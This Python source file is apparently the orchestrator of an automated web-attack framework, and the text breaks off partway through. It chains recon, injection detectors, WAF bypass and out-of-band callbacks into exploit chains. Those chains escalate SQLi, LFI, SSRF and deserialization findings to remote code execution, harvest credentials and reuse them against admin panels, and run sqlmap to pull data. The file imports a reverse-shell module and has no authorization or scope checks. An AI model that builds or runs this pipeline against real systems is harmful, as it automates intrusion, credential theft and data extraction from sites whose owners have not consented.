import json, time, threading, concurrent.futures
from typing import Dict, List, Optional

from tools.log_utils import get_logger

logger = get_logger("orchestrator")

from tools import (
    crawler, param_miner,
    sql_injection, xss_detector, ssti_detector, cmdi_detector,
    ssrf_detector, nosqli_detector, lfi_scanner, auth_bypass,
    sqli_weaponizer, jwt_exploiter, reverse_shell,
    race_condition, jwt_detector, graphql_scanner, cors_scanner,
    deserialization_detector, proto_pollution,
    waf_bypass, biz_logic_scanner,
)
from tools.oob_server import OOBServer
from tools.response_profiler import ResponseProfiler
from tools.verification_oracle import VerificationOracle
from tools.dual_session import DualSessionManager
from tools.playwright_engine import PlaywrightEngine
from tools.spa_crawler import crawl_spa
from tools.recon import (
    enum_subdomains, scan_ports, fingerprint_tech,
    check_git_leak, fuzz_directories,
)
from tools.attack_surface import build_attack_plan, pivot_on_intermediate_result
from tools.reasoning_engine import ReasoningEngine
from tools.adaptive_fuzzer import AdaptiveFuzzer

SKIP_PARAMS = {
    "submit", "button", "reset", "image", "file", "action",
    "_method", "_token", "utf8", "commit", "form_id", "form_build_id",
    "form_token", "authenticity_token",
}
SIGNATURE_PLACEHOLDER = "__placeholder__"

ALL_DETECTORS = {
    "sql_injection": lambda u, p, s, t, w, o: sql_injection.check(u, p, s, t, waf_name=w),
    "xss": lambda u, p, s, t, w, o: xss_detector.check(u, p, s, t, waf_name=w),
    "ssti": lambda u, p, s, t, w, o: ssti_detector.check(u, p, s, t, waf_name=w),
    "cmdi": lambda u, p, s, t, w, o: cmdi_detector.check(u, p, s, t, waf_name=w, oob_url=o.get("oob_url"), oob_domain=o.get("oob_domain")),
    "ssrf": lambda u, p, s, t, w, o: ssrf_detector.check(u, p, s, t, oob_server=o.get("oob_url")),
    "nosqli": lambda u, p, s, t, w, o: nosqli_detector.check(u, p, s, t, waf_name=w),
    "lfi": lambda u, p, s, t, w, o: lfi_scanner.check(u, p, s, t, waf_name=w),
    "race": lambda u, p, s, t, w, o: race_condition.check(u, p, s, t),
    "jwt": lambda u, p, s, t, w, o: jwt_detector.check(u, p, s, t),
    "graphql": lambda u, p, s, t, w, o: graphql_scanner.check(u, p, s, t),
    "cors": lambda u, p, s, t, w, o: cors_scanner.check(u, p, s, t),
    "deser": lambda u, p, s, t, w, o: deserialization_detector.check(u, p, s, t),
    "proto_pollution": lambda u, p, s, t, w, o: proto_pollution.check(u, p, s, t),
    "bizlogic": lambda u, p, s, t, w, o: biz_logic_scanner.check(u, p, s, t),
    "waf_heavy": lambda u, p, s, t, w, o: waf_bypass.heavy_check(u, p, s, t),
}

DETECTOR_RISK_ORDER = {
    "sql_injection": 0, "cmdi": 0, "deser": 0,
    "ssrf": 1, "lfi": 1, "ssti": 1,
    "xss": 2, "nosqli": 2, "bizlogic": 2,
    "jwt": 3, "graphql": 3, "cors": 3,
    "proto_pollution": 3, "race": 4, "waf_heavy": 5,
}


class Orchestrator:
    def __init__(self, target: str,
                 sess: Optional['requests.Session'] = None, timeout: float = 10.0,
                 threads: int = 10, max_pages: int = 30, max_depth: int = 2,
                 high_priv_sess: Optional['requests.Session'] = None,
                 fast_recon: bool = True, time_budget: Optional[float] = None):
        self.target = target.rstrip("/")
        self.timeout = timeout
        self.sess = sess
        self.high_priv_sess = high_priv_sess
        self.threads = threads
        self.max_pages = max_pages
        self.max_depth = max_depth
        self.fast_recon = fast_recon
        self.time_budget = time_budget or 600.0
        self._start_time = time.time()
        self.state = {
            "phases": {},
            "vulnerabilities": [],
            "exploits": [],
            "summary": {},
        }
        self.profiler = ResponseProfiler()
        self.oracle = VerificationOracle(self.profiler)
        self.dual_session = DualSessionManager(sess, high_priv_sess)
        self.oob_server = OOBServer.get_instance()
        self.attack_plan = None
        self.all_findings = {}
        self.reasoner = ReasoningEngine(target)
        self.last_hypotheses = []
        self._chain_cache = {}
        self.attack_tree = None
        self._backtrack_findings = []

    def phase_recon(self) -> Dict:
        print("[Recon] Phase 1/7: Reconnaissance ...")
        recon = {"target": self.target}

        print("  [Recon] Technology fingerprint ...")
        recon["technologies"] = fingerprint_tech(self.target, self.sess, self.timeout)
        techs = recon["technologies"].get("technologies", [])
        if techs:
            print("    -> %d technologies detected" % len(techs))
            for t in techs[:10]:
                print("      - %s" % t["name"])
        else:
            print("    -> No specific tech detected")

        print("  [Recon] Quick port scan (top 100) ...")
        recon["open_ports"] = scan_ports(self.target, fast=self.fast_recon)
        open_count = recon["open_ports"].get("open_count", 0)
        if open_count:
            print("    -> %d open ports" % open_count)
            for p in recon["open_ports"].get("open_ports", [])[:10]:
                print("      - %d/%s (%s)" % (p["port"], p["service"], p["state"]))
        else:
            print("    -> No obvious open ports")

        print("  [Recon] Git leak check ...")
        recon["git_leak"] = check_git_leak(self.target, self.sess, self.timeout, deep=False)
        if recon["git_leak"].get("git_exposed"):
            sf = len(recon["git_leak"].get("sensitive_finds", []))
            print("    [CRITICAL] .git exposed! %d sensitive finds" % sf)
        else:
            print("    -> No git exposure")

        print("  [Recon] Directory fuzzing (common paths) ...")
        recon["directories"] = fuzz_directories(
            self.target, sess=self.sess, timeout=self.timeout,
            follow_redirects=False,
        )
        interesting = recon["directories"].get("interesting", [])
        if interesting:
            print("    -> %d interesting paths" % len(interesting))
            for d in interesting[:8]:
                print("      - %s [%d] (%d bytes)" % (
                    d["path"], d["status"], d["size"]))
        else:
            print("    -> No interesting paths found")

        self.state["phases"]["recon"] = recon
        return recon

    def phase_attack_plan(self) -> Dict:
        print("[Recon] Building attack plan from recon results ...")
        recon = self.state["phases"].get("recon", {})

        flat_techs = recon.get("technologies", {}).get("technologies", [])
        flat_ports = recon.get("open_ports", {}).get("open_ports", [])
        plan_input = {
            "target": self.target,
            "technologies": flat_techs,
            "open_ports": flat_ports,
            "git_leak": recon.get("git_leak", {}),
            "directories": recon.get("directories", {}).get("interesting", []),
        }

        plan = build_attack_plan(plan_input)

        if plan["phases"]:
            print("  -> Attack plan: %d phases, risk score=%d" % (
                len(plan["phases"]), plan["risk_score"]))
            for ph in plan["phases"][:5]:
                risk = ph.get("risk", "?")
                detail = ""
                if "tech" in ph:
                    detail = ph["tech"]
                elif "port" in ph:
                    detail = "port %d/%s" % (ph["port"], ph.get("module", "?"))
                elif "detectors" in ph:
                    detail = ", ".join(ph["detectors"][:5])
                print("    [%s] %s: %s" % (risk, ph.get("phase", "?"), detail))
        else:
            print("  -> No attack plan generated, falling back to generic")

        self.attack_plan = plan
        self.state["phases"]["attack_plan"] = plan
        return plan

    def phase_reason(self) -> List[Dict]:
        print("[Reason] Phase 1b/7: Hypothesis-driven reasoning ...")
        recon = self.state["phases"].get("recon", {})
        plan = self.attack_plan or {}
        crawl_data = self.state["phases"].get("crawl", {})
        existing_vulns = self.state.get("vulnerabilities", [])

        context = {
            "technologies": recon.get("technologies", {}).get("technologies", []),
            "open_ports": recon.get("open_ports", {}).get("open_ports", []),
            "directories": recon.get("directories", {}).get("interesting", []),
            "git_leak": recon.get("git_leak", {}),
            "vulnerabilities": existing_vulns,
            "crawl_endpoints": crawl_data.get("endpoints", {}),
            "attack_plan": plan,
        }

        hypotheses = self.reasoner.analyze(context)
        self.last_hypotheses = self.reasoner.correlate_hypotheses(hypotheses)

        if hypotheses:
            print("  -> %d hypotheses generated (%d after correlation):" % (
                len(hypotheses), len(self.last_hypotheses)))
            for h in self.last_hypotheses[:8]:
                stars = "*" if h.priority == 0 else ""
                cve_tag = ""
                if h.detail.get("cve_ids") or h.detail.get("matched_cves"):
                    ids = h.detail.get("matched_cves", h.detail.get("cve_ids", []))
                    cve_tag = " [%s]" % ", ".join(ids[:2])
                print("    %s [p=%d] %.0f%% %s%s" % (stars, h.priority, h.confidence * 100, h.vuln_type, cve_tag))
                if h.evidence:
                    print("      evidence: %s" % h.evidence[0][:120])
                if h.suggested_chain:
                    print("      chain: %s" % h.suggested_chain)
        else:
            print("  -> No specific hypotheses, falling back to broad scan")

        attack_tree = self.reasoner.build_attack_tree(context)
        self.attack_tree = attack_tree
        paths = attack_tree.best_paths(min_confidence=0.20)
        if paths:
            print("  -> Attack tree: %d nodes, top paths:" % len(attack_tree.nodes))
            for path in paths[:4]:
                print("    %.0f%% %s" % (path["confidence"] * 100, path["path_string"]))
                if path["chain"]:
                    print("      → %s" % path["chain"])

        hypo_dicts = [h.to_dict() for h in self.last_hypotheses]
        self.state["phases"]["reason"] = {
            "hypotheses": hypo_dicts, "count": len(self.last_hypotheses),
            "attack_tree": attack_tree.summary(),
        }
        return hypo_dicts

    def phase_crawl(self) -> Dict:
        result = crawler.crawl(self.target, max_depth=self.max_depth,
                                max_pages=self.max_pages, sess=self.sess,
                                timeout=self.timeout)
        self.state["phases"]["crawl"] = result
        return result

    def phase_mine(self, crawl_result: Dict = None) -> Dict:
        if crawl_result is None:
            crawl_result = self.state["phases"].get("crawl", {})
        endpoints = crawl_result.get("endpoints", {})
        if not endpoints:
            endpoints = {"/": {"url": self.target, "methods": ["GET"], "params": []}}
        result = param_miner.mine(self.target, endpoints, self.sess,
                                    self.timeout, self.threads)
        self.state["phases"]["param_mine"] = result
        return result

    def _select_detectors(self) -> List[str]:
        if self.last_hypotheses:
            suggested = self.reasoner.suggest_detectors(self.last_hypotheses)
            if suggested:
                for d in list(ALL_DETECTORS.keys()):
                    if d not in suggested:
                        suggested.append(d)
                return suggested

        plan = self.attack_plan
        recommended = []
        if plan and plan.get("recommended_detectors"):
            recommended = plan["recommended_detectors"]
            mapped = []
            for d in recommended:
                if d in ALL_DETECTORS:
                    mapped.append(d)
                elif d == "sql_injection":
                    mapped.append("sql_injection")
            recommended = mapped
        if not recommended:
            recommended = list(ALL_DETECTORS.keys())

        recommended.sort(key=lambda d: DETECTOR_RISK_ORDER.get(d, 9))
        return recommended

    def _build_test_points(self) -> List[Dict]:
        points = []
        crawl_data = self.state["phases"].get("crawl", {})
        mine_data = self.state["phases"].get("param_mine", {})
        seen = set()
        all_params = set(crawl_data.get("parameters", []))

        for path_data in mine_data.values():
            if isinstance(path_data, dict):
                for p in path_data.get("all_params", []):
                    all_params.add(p)

        for path, info in crawl_data.get("endpoints", {}).items():
            url = info.get("url", "%s%s" % (self.target, path))
            for p in set(info.get("params", []) + list(all_params)[:5]):
                if p.lower() in SKIP_PARAMS:
                    continue
                key = "%s|%s|GET" % (url, p)
                if key not in seen:
                    seen.add(key)
                    points.append({"url": url, "param": p, "method": "GET"})

        for path, pd in mine_data.items():
            if not isinstance(pd, dict):
                continue
            url = "%s%s" % (self.target, path)
            mined = set()
            for p in pd.get("get_params", []):
                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
                    mined.add(p["param"])
            for p in pd.get("post_params", []):
                if isinstance(p, dict) and p.get("status", 404) not in (0, 404, 400) and isinstance(p.get("param"), str):
                    mined.add(p["param"])
            for p in mined:
                if p.lower() in SKIP_PARAMS:
                    continue
                key = "%s|%s|GET" % (url, p)
                if key not in seen:
                    seen.add(key)
                    points.append({"url": url, "param": p, "method": "GET"})

        dirs = self.state.get("phases", {}).get("recon", {}).get("directories", {}).get("interesting", [])
        for d in dirs[:20]:
            full_url = self.target.rstrip("/") + d["path"]
            key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
            if key not in seen:
                seen.add(key)
                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_recon": True})

        js_apis = crawl_data.get("js_api_endpoints", [])
        for api_path in js_apis:
            full_url = api_path if api_path.startswith("http") else "%s%s" % (self.target, api_path)
            key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
            if key not in seen:
                seen.add(key)
                points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_js": True})
            for param_guess in ["id", "page", "q", "token", "key", "limit", "offset", "filter", "search"]:
                pk = "%s|%s|GET" % (full_url, param_guess)
                if pk not in seen:
                    seen.add(pk)
                    points.append({"url": full_url, "param": param_guess, "method": "GET", "from_js": True})

        plan = self.attack_plan
        if plan:
            for ph in plan.get("phases", []):
                if ph.get("phase") == "tech_specific":
                    for mod in ph.get("priority_modules", []):
                        full_url = self.target.rstrip("/") + mod
                        key = "%s|%s|GET" % (full_url, SIGNATURE_PLACEHOLDER)
                        if key not in seen:
                            seen.add(key)
                            points.append({"url": full_url, "param": SIGNATURE_PLACEHOLDER, "method": "GET", "from_plan": True})

        techs = [t.get("id", "") for t in self.state.get("phases", {}).get("recon", {}).get("technologies", {}).get("technologies", [])]
        if techs:
            for p in points:
                score = self.reasoner.score_endpoint(p["param"], techs)
                p["_score"] = score
            points.sort(key=lambda p: -p.get("_score", 0))

        if techs and points:
            fuzzer = AdaptiveFuzzer(tech_stack=techs)
            enriched = []
            seen_url_params = set()
            for p in points:
                key = (p["url"], p["param"])
                if key in seen_url_params:
                    continue
                seen_url_params.add(key)
                groups = fuzzer.all_groups(
                    param_name=p["param"],
                    url_path=p["url"].replace(self.target, ""),
                )
                p["_payload_groups"] = [
                    {"vuln_type": g.vuln_type, "confidence": g.confidence, "count": len(g.payloads)}
                    for g in groups[:5]
                ]
                enriched.append(p)
            points = enriched

        return points[:250]

    def _budget_remaining(self) -> float:
        return self.time_budget - (time.time() - self._start_time)

    def _budget_ok(self, needed: float = 5.0) -> bool:
        return self._budget_remaining() > needed

    def _filter_by_budget(self, points: List[Dict]) -> List[Dict]:
        remaining = self._budget_remaining()
        if remaining > self.time_budget * 0.5:
            return points
        if remaining < 30:
            return points[:50]
        ratio = remaining / self.time_budget
        cutoff = max(int(len(points) * ratio), 10)
        return points[:cutoff]

    def _maybe_backtrack_chain(self, finding: Dict) -> Optional[Dict]:
        vtype = finding.get("type", "").lower()
        url = finding.get("url", "")
        param = finding.get("param", "")
        chain_key = "%s|%s|%s" % (vtype, url, param)
        if chain_key in self._chain_cache:
            return None

        from tools.chain_engine import ChainEngine
        chain = ChainEngine(self.sess, self.timeout)

        vtype_to_chain = {
            "ssrf": ("ssrf_to_rce", chain.chain_ssrf_to_rce),
            "lfi": ("lfi_to_rce", chain.chain_lfi_to_rce),
            "sqli": ("sqli_to_rce", chain.chain_sqli_to_rce),
            "xss": ("xss_to_hijack", chain.chain_xss_to_hijack),
            "deser": ("deser_to_rce", chain.chain_deser_to_rce),
        }

        if vtype in vtype_to_chain and self._budget_ok(10):
            cname, cfn = vtype_to_chain[vtype]
            print("\n    [Backtrack] %s on %s?%s — running %s NOW" % (vtype.upper(), url, param, cname))
            try:
                r = cfn(url, param)
                self._chain_cache[chain_key] = r
                if r.get("success"):
                    print("      [CRITICAL] Chain %s confirmed mid-scan!" % cname)
                    if r.get("credentials_extracted"):
                        print("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
                    if r.get("rce_available"):
                        print("      [RCE] %s" % r.get("rce_method", "?"))
                return r
            except Exception as e:
                logger.debug("backtrack chain %s: %s", cname, e)

        return None

    def _cross_verify(self, vtype: str, url: str, param: str,
                       waf_name: str, oob: dict, first_result: dict) -> dict:
        """Multi-angle verification: confirm with at least 2 different methods."""
        cross_checks = {
            "ssrf": [("lfi", "file:///etc/passwd"), ("cmdi", "curl localhost")],
            "lfi": [("ssrf", "file:///etc/passwd")],
            "sqli": [("ssrf", None), ("nosqli", None)],
            "xss": [("ssti", "{{7*7}}")],
            "nosqli": [("sqli", None)],
            "cmdi": [("ssrf", None)],
        }

        checks = cross_checks.get(vtype, [])
        cross_findings = []

        for alt_type, alt_payload in checks:
            if not self._budget_ok(3):
                break
            fn = ALL_DETECTORS.get(alt_type)
            if not fn:
                continue
            try:
                test_param = param if alt_payload is None else None
                r = fn(url, test_param or param, self.sess, self.timeout, waf_name, oob)
                if isinstance(r, dict) and (r.get("vulnerable") or r.get("total_bypasses", 0) > 0):
                    cv = self.oracle.verify(alt_type, r, url, param, self.sess, self.timeout)
                    if cv.get("verified") is not False:
                        cross_findings.append(alt_type)
            except Exception:
                pass

        first_result["cross_verified"] = cross_findings
        first_result["cross_count"] = len(cross_findings)
        first_result["confirmed"] = len(cross_findings) >= 1 or first_result.get("verified") is not False
        return first_result

    def _backtrack_loop_closure(self, chain_result: dict, finding: dict) -> None:
        """Feed chain output back into new attack surface.

        If a chain extracts credentials, try them on discovered services.
        If it gets RCE, mark completion.
        """
        if not chain_result or not chain_result.get("success"):
            return

        creds = chain_result.get("credentials_extracted", [])
        rce = chain_result.get("rce_available")
        vtype = finding.get("type", "").lower()

        if creds:
            print("    [Loop] %d credentials recovered — probing stored services" % len(creds))
            for cred in creds[:5]:
                self.state.setdefault("recovered_credentials", []).append(cred)

        if rce:
            print("    [Loop] RCE achieved via %s — marking attack surface" % vtype)
            self.state.setdefault("exploits", []).append({
                "source": vtype,
                "type": "rce",
                "url": finding.get("url", ""),
                "credential_count": len(creds),
                "chain_result": chain_result.get("rce_method", "unknown"),
            })

        if vtype == "sqli" and creds:
            for c in creds:
                if ":" in c or "@" in c:
                    print("    [Loop] Credential format %s — will try on discovered admin panels" %
                          c.split(":")[0] if ":" in c else c.split("@")[0])
                    self.state.setdefault("admin_creds", []).append(c)

    def _test_single_point(self, point: Dict, active_detectors: List[str],
                           waf_name: Optional[str] = None,
                           oob_url: Optional[str] = None,
                           oob_domain: Optional[str] = None) -> List[Dict]:
        if not self._budget_ok(2):
            return []

        url = point["url"]
        param = point["param"]
        oob = {"oob_url": oob_url, "oob_domain": oob_domain}
        results = []

        for vtype in active_detectors:
            if not self._budget_ok(2):
                break
            time_sensitive = {"sqli", "cmdi", "nosqli", "ssti"}
            if vtype in time_sensitive and not self._budget_ok(10):
                continue

            fn = ALL_DETECTORS.get(vtype)
            if fn is None:
                continue
            try:
                r = fn(url, param, self.sess, self.timeout, waf_name, oob)
                if isinstance(r, dict):
                    vuln = r.get("vulnerable") or r.get("total_bypasses", 0) > 0
                    if vuln and self._budget_ok(5):
                        r = self._cross_verify(vtype, url, param, waf_name, oob, r)
                        vuln = r.get("confirmed", vuln)
                    if vuln:
                        verified = self.oracle.verify(vtype, r, url, param, self.sess, self.timeout)
                        if verified.get("verified") is not False:
                            finding = {
                                "type": vtype,
                                "url": url,
                                "param": param,
                                "result": verified,
                            }
                            results.append(finding)

                            with self._lock if hasattr(self, '_lock') else threading.Lock():
                                self._backtrack_findings.append(finding)

                            chain_result = self._maybe_backtrack_chain(finding)
                            if chain_result:
                                finding["_chain_result"] = chain_result
                                self._backtrack_loop_closure(chain_result, finding)
            except Exception as e:
                logger.debug("detect %s on %s?%s: %s", vtype, url, param, e)
        return results

    def phase_auth_bypass(self) -> Dict:
        result = auth_bypass.check(self.target, self.sess, self.timeout)
        self.state["phases"]["auth_bypass"] = result
        return result

    def phase_detect(self) -> Dict:
        active = self._select_detectors()
        print("  -> Active detectors (%d): %s" % (len(active), ", ".join(active)))

        waf_info = waf_bypass.fingerprint_waf(self.target, self.sess, self.timeout)
        waf_name = waf_info.get("name")
        if waf_name:
            print("  [WAF] %s detected - using bypass strategies" % waf_name)
        self.state["waf"] = waf_info

        points = self._build_test_points()
        points = self._filter_by_budget(points)
        budget_pct = self._budget_remaining() / self.time_budget * 100
        print("  -> %d test points (%.0f%% budget remaining)" % (len(points), budget_pct))

        cb_id = "scan_%d" % id(self)
        oob_url = self.oob_server.register_callback_id(cb_id)
        oob_domain = None
        if self.oob_server.start_dns():
            oob_domain = self.oob_server.start_dns()

        profiled = self.profiler.profile_batch(points, self.sess, self.timeout)
        if profiled:
            print("  -> %d endpoints profiled for anomaly detection" % profiled)

        all_findings = {}
        self._lock = threading.Lock()
        done = [0]
        total = len(points)

        def worker(point):
            findings = self._test_single_point(
                point, active, waf_name,
                oob_url=oob_url, oob_domain=oob_domain,
            )
            with self._lock:
                for f in findings:
                    key = "%s|%s|%s" % (f["type"], f["url"], f["param"])
                    all_findings[key] = f
                done[0] += 1
                if done[0] % 5 == 0 or done[0] == total:
                    print("    \r    progress: %d/%d (found %d)" % (
                        done[0], total, len(all_findings)), end="", flush=True)

        if self.threads > 1 and budget_pct > 10:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.threads) as ex:
                list(ex.map(worker, points))
        else:
            for p in points:
                worker(p)
        print()

        oob_callbacks = self.oob_server.pop_callbacks(cb_id)
        oob_hits = len(oob_callbacks)
        if oob_hits:
            print("  [OOB] %d blind callbacks received" % oob_hits)
            all_findings["__oob_callbacks__"] = {
                "type": "oob",
                "url": self.target,
                "param": "",
                "result": {
                    "vulnerable": True, "type": "oob_callback",
                    "confidence": "high", "confirmed": True,
                    "evidence": ["%d OOB callbacks" % oob_hits],
                    "callbacks": [{"path": c.path, "client": str(c.client)} for c in oob_callbacks[:10]],
                },
            }

        self.state["phases"]["detect"] = {"test_points": total, "findings": all_findings}
        self.all_findings = all_findings
        self._run_kali_recon()

        if self._backtrack_findings:
            print("  [Bayes] Updating hypotheses with %d findings ..." % len(self._backtrack_findings))
            evidence_map = {}
            for f in self._backtrack_findings:
                vt = f.get("type", "").lower()
                evidence_map[vt] = f.get("result", f)
            if self.last_hypotheses:
                self.last_hypotheses = self.reasoner.update_with_evidence(
                    self.last_hypotheses, evidence_map)
                revised = self.reasoner.suggest_detectors(self.last_hypotheses)
                new_detectors = [d for d in revised if d not in active]
                if new_detectors:
                    print("    -> Revised detector priority: first %d remain, added %s" % (
                        len(active), new_detectors[:3]))

        return all_findings

    def phase_pivot(self) -> Dict:
        findings = self.all_findings
        plan = self.attack_plan or {}
        pivot_results = {"pivot_actions": [], "exploits": []}

        vuln_list = []
        for k, f in findings.items():
            vuln_list.append({"type": f["type"], "url": f["url"], "param": f["param"]})

        confirmed_types = {v["type"].lower() for v in vuln_list}

        if self.last_hypotheses:
            evidence_map = {}
            for v in vuln_list:
                evidence_map[v["type"]] = {"vulnerable": True}
            self.last_hypotheses = self.reasoner.update_with_evidence(
                self.last_hypotheses, evidence_map)
            chains = self.reasoner.suggest_chains(self.last_hypotheses, confirmed_types)
        else:
            chains = []

        if self._chain_cache:
            for key, r in self._chain_cache.items():
                pivot_results["pivot_actions"].append(r)
            print("  [Pivot] %d chains already executed during backtrack" % len(self._chain_cache))

        pivoted = pivot_on_intermediate_result(
            {"vulnerabilities": vuln_list},
            plan,
        )

        from tools.chain_engine import ChainEngine
        chain = ChainEngine(self.sess, self.timeout)

        chain_map = {
            "ssrf_to_rce": ("ssrf", chain.chain_ssrf_to_rce),
            "lfi_to_rce": ("lfi", chain.chain_lfi_to_rce),
            "sqli_to_rce": ("sqli", chain.chain_sqli_to_rce),
            "xss_to_hijack": ("xss", chain.chain_xss_to_hijack),
            "auth_bypass_to_rce": ("auth_bypass", lambda u, p: chain.chain_auth_to_admin()),
            "deser_to_rce": ("deser", chain.chain_deser_to_rce),
        }

        used_chains = set()
        for chain_name, ep, param in chains:
            if chain_name in chain_map and chain_name not in used_chains:
                needed_type, fn = chain_map[chain_name]
                matching = [v for v in vuln_list if v["type"] == needed_type]
                for v in matching:
                    print("    [Reason] Chain %s %s via %s?%s" % (chain_name, v["type"], v["url"], v["param"]))
                    used_chains.add(chain_name)
                    try:
                        r = fn(v["url"], v["param"])
                        pivot_results["pivot_actions"].append(r)
                        if r.get("success"):
                            print("      [CRITICAL] Chain %s confirmed!" % chain_name)
                        if r.get("credentials_extracted"):
                            print("      [CREDENTIAL] %s" % r["credentials_extracted"][:3])
                        if r.get("rce_available"):
                            print("      [RCE] %s via %s" % (chain_name, r.get("rce_method", "unknown")))
                    except Exception as e:
                        logger.debug("chain %s: %s", chain_name, e)
                    break

        if pivoted.get("pivoted"):
            print("  [Pivot] Attack surface triggered additional chain actions:")

            for ph in pivoted.get("phases", []):
                if ph.get("phase") in ("ssrf_pivot",) and "ssrf_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "ssrf":
                            print("    -> SSRF detected, running cloud metadata + internal scan chain")
                            r = chain.chain_ssrf_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("ssrf_to_rce")
                            break

                if ph.get("phase") in ("lfi_pivot",) and "lfi_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "lfi":
                            print("    -> LFI detected, running log poison + environ leak chain")
                            r = chain.chain_lfi_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("lfi_to_rce")
                            break

                if ph.get("phase") in ("sqli_pivot",) and "sqli_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "sqli":
                            print("    -> SQLi detected, running data extraction + shell chain")
                            r = chain.chain_sqli_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("sqli_to_rce")
                            break

                if ph.get("phase") in ("jwt_pivot",):
                    for v in vuln_list:
                        if v["type"] == "jwt":
                            print("    -> JWT found, running alg none + weak secret + KID injection")
                            try:
                                from tools import jwt_exploiter
                                exploit_r = jwt_exploiter.check(
                                    url=v["url"], param=v["param"], sess=self.sess,
                                    timeout=self.timeout,
                                )
                                pivot_results["pivot_actions"].append({
                                    "chain": "jwt_exploit", "result": exploit_r,
                                })
                                if exploit_r.get("vulnerable"):
                                    print("      [CRITICAL] JWT bypassed!")
                            except Exception as e:
                                logger.debug("jwt pivot: %s", e)

                if ph.get("phase") in ("auth_pivot",) and "auth_bypass_to_rce" not in used_chains:
                    auth_data = self.state["phases"].get("auth_bypass", {})
                    if auth_data.get("vulnerable"):
                        print("    -> Auth bypass found, escalating to admin")
                        r = chain.chain_auth_to_admin(self.target)
                        pivot_results["pivot_actions"].append(r)
                        used_chains.add("auth_bypass_to_rce")
                        if r.get("success"):
                            print("      [CRITICAL] Admin access achieved via auth escalation!")

                if ph.get("phase") in ("deser_pivot",) and "deser_to_rce" not in used_chains:
                    for v in vuln_list:
                        if v["type"] == "deser":
                            print("    -> Deserialization found, running gadget chain")
                            r = chain.chain_deser_to_rce(v["url"], v["param"])
                            pivot_results["pivot_actions"].append(r)
                            used_chains.add("deser_to_rce")
                            if r.get("success"):
                                print("      [CRITICAL] Deserialization gadget confirmed!")
                            break

                if ph.get("phase") in ("graphql_pivot",):
                    for v in vuln_list:
                        if v["type"] == "graphql":
                            pivot_results["pivot_actions"].append({
                                "chain": "graphql_deep",
                                "url": v["url"],
                                "action": "introspection + batch + depth analysis",
                            })
                            break

        self.state["phases"]["pivot"] = pivot_results
        return pivot_results

    def _run_kali_recon(self):
        from tools.kali_executor import is_available
        if not is_available():
            return
        print("  [Kali] Running heavy recon tools...")
        from tools import kali_toolset
        try:
            tech_result = kali_toolset.whatweb_identify(self.target)
            if tech_result.get("technologies"):
                print("  [Kali] whatweb: %d technologies detected" % len(tech_result["technologies"]))
                self.state["technologies"] = tech_result["technologies"]
        except Exception as e:
            logger.debug("kali whatweb: %s", e)
        try:
            nmap_result = kali_toolset.nmap_scan(self.target, fast=True)
            if nmap_result.get("ports"):
                print("  [Kali] nmap: %d open ports found" % nmap_result["count"])
                self.state["open_ports"] = nmap_result["ports"]
        except Exception as e:
            logger.debug("kali nmap: %s", e)
        try:
            nuclei_result = kali_toolset.nuclei_scan(self.target)
            if nuclei_result.get("findings"):
                print("  [Kali] nuclei: %d template matches" % nuclei_result["count"])
                existing = self.state["phases"].get("detect", {}).get("findings", {})
                for f in nuclei_result["findings"]:
                    key = "nuclei|%s|%s" % (f.get("template", ""), self.target)
                    existing[key] = {"type": "nuclei", "url": self.target, "param": "",
                                     "result": {"vulnerable": True, "template": f}}
                self.state["nuclei_findings"] = nuclei_result["findings"]
        except Exception as e:
            logger.debug("kali nuclei: %s", e)

    def phase_dual_session(self) -> Dict:
        if self.high_priv_sess is None:
            return {"skipped": True, "reason": "no high_priv session"}
        points = self._build_test_points()
        result = self.dual_session.test_batch(points, self.timeout)
        bola_count = result.get("bola_count", 0)
        info_count = result.get("info_disclosure_count", 0)
        if bola_count or info_count:
            print("  -> %d BOLA, %d info disclosure across %d endpoints" % (
                bola_count, info_count, result.get("tested", 0)))
            findings = self.state["phases"].get("detect", {}).get("findings", {})
            for f in result.get("bola_findings", []):
                key = "bola|%s|%s" % (f.get("url", ""), f.get("param", "id"))
                findings[key] = {"type": "bola", "url": f.get("url", ""), "param": f.get("param", "id"),
                                 "result": {"vulnerable": True, "type": "bola", "confidence": "high",
                                            "evidence": f.get("evidence", [])}}
            for f in result.get("info_disclosure_findings", []):
                key = "info_disclosure|%s|%s" % (f.get("url", ""), f.get("param", "id"))
                findings[key] = {"type": "info_disclosure", "url": f.get("url", ""), "param": f.get("param", "id"),
                                 "result": {"vulnerable": True, "type": "info_disclosure", "confidence": "high",
                                            "evidence": f.get("evidence", [])}}
        self.state["phases"]["dual_session"] = result
        return result

    def phase_weaponize(self) -> Dict:
        findings = self.state["phases"].get("detect", {}).get("findings", {})
        auth_data = self.state["phases"].get("auth_bypass", {})
        exploits = {}
        raw_sess = self.sess

        def _weaponize_one(key, finding):
            vtype = finding["type"]
            url = finding["url"]
            param = finding["param"]
            result = {}

            if vtype == "sqli":
                for mod_name, mod in [("sqli_weaponizer", sqli_weaponizer)]:
                    try:
                        result[mod_name] = mod.check(url, param, raw_sess, self.timeout)
                    except Exception as e:
                        logger.debug("sqli weaponize %s: %s", mod_name, e)
                    if result.get(mod_name, {}).get("vulnerable") or result.get(mod_name, {}).get("data_extracted"):
                        result["exploit_ready"] = True
                from tools.kali_executor import is_available as kali_avail
                if kali_avail():
                    try:
                        from tools import kali_toolset
                        sqlmap_r = kali_toolset.sqlmap_detect(url, param)
                        if sqlmap_r.get("vulnerable") or sqlmap_r.get("data"):
                            result["sqlmap"] = sqlmap_r
                            result["exploit_ready"] = True
                            if sqlmap_r.get("data"):
                                result["extracted_data"] = sqlmap_r["data"]
                    except Exception as e:
                        logger.debug("sqlmap weaponize: %s", e)

            if vtype == "ssrf":
                try:
